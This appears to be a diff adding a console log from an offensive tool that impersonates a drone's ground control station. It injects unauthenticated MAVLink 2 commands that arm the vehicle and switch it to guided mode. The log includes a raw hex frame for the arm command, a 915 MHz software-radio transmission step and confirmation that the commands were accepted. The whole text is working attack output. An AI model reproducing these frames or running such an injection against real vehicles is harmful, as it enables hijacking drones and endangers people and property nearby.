@@ -1,0 +1,20 @@
+========== PWNUAV COMMAND INJECTION — GCS impersonation ==========
+[C2-01] Impersonating ground control station  sysid=255 compid=190
+[C2-02] Target vehicle sysid=1 ; MAVLink2 signing OFF -> sender not verified
+
+[*] Injection set:
+   1) COMMAND_LONG MAV_CMD_COMPONENT_ARM_DISARM  (ARM)
+   2) COMMAND_LONG MAV_CMD_DO_SET_MODE  (SET_GUIDED)
+
+[*] Frame #1 (ARM) — raw MAVLink 2 on the air:
+  0000  FD 20 00 00 00 FF BE 4C 00 00 00 00 80 3F 00 00   . .....L.....?..
+  0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+  0020  00 00 00 00 00 00 90 01 01 01 9E 4E               ...........N
+
+[EX] Transmitting injection burst on 915 MHz (Pluto) ...
+
+[*] Confirmed on the air (2,066,080 IQ samples, 27 COMMAND_LONG decoded):
+   ARM        ->  13 valid frames  target=1  src=255  param1=1        OK
+   SET_GUIDED ->  14 valid frames  base_mode=CUSTOM  custom_mode=4   OK
+
+[+] INJECTION LANDED — unauthenticated commands accepted on the link (EX-01/EX-02).
